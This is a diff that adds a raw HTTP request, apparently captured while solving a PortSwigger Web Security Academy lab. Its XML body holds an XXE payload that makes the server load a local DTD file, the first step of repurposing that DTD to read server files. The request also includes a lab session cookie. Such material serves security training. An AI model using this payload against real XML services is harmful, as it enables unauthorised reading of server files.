@@ -1,0 +1,21 @@
+POST /product/stock HTTP/2
+Host: 0ab500d6034f554a82a7253900270097.web-security-academy.net
+Cookie: session=6z1ccpIFtaUM2T1IOGB0imdTGnT4ZkaA
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/111.0
+Accept: */*
+Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Referer: https://0ab500d6034f554a82a7253900270097.web-security-academy.net/product?productId=1
+Content-Type: application/xml
+Content-Length: 209
+Origin: https://0ab500d6034f554a82a7253900270097.web-security-academy.net
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: same-origin
+Te: trailers
+Connection: close
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///usr/share/xml/schema/xml-core/catalog.dtd">%xxe;]>
+<stockCheck><productId>1</productId><storeId>2
+</storeId></stockCheck>
